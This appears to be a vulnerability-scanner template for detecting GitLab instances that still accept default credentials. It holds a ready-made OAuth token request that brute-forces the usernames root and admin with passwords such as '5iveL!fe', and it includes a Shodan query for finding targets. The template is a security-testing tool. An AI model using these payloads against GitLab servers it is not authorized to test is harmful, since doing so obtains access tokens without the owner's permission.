id: gitlab-weak-login
info:
  name: Gitlab Default Login
  author: Suman_Kar,dwisiswant0
  severity: high
  description: Gitlab default login credentials were discovered.
  reference:
    - https://twitter.com/0xmahmoudJo0/status/1467394090685943809
    - https://git-scm.com/book/en/v2/Git-on-the-Server-GitLab
  classification:
    cwe-id: CWE-798
    cpe: cpe:2.3:a:gitlab:gitlab:*:*:*:*:*:*:*:*
  metadata:
    runzero-match: any(each(service["html.titles"]), {# matches "GitLab"})
    max-request: 6
    product: gitlab
    shodan-query: http.title:"GitLab"
    vendor: gitlab
  tags: default-login,gitlab,vuln
http:
  - attack: clusterbomb
    matchers:
      - status:
          - 200
        type: status
      - part: header
        type: word
        words:
          - application/json
      - condition: and
        part: body
        type: word
        words:
          - '"access_token":'
          - '"token_type":'
          - '"refresh_token":'
    matchers-condition: and
    payloads:
      password:
        - 5iveL!fe
        - "123456789"
      username:
        - root
        - admin
        - admin@local.host
    raw:
      - |
        POST /oauth/token HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/plain, */*
        Referer: {{BaseURL}}
        content-type: application/json

        {"grant_type":"password","username":"{{username}}","password":"{{password}}"}
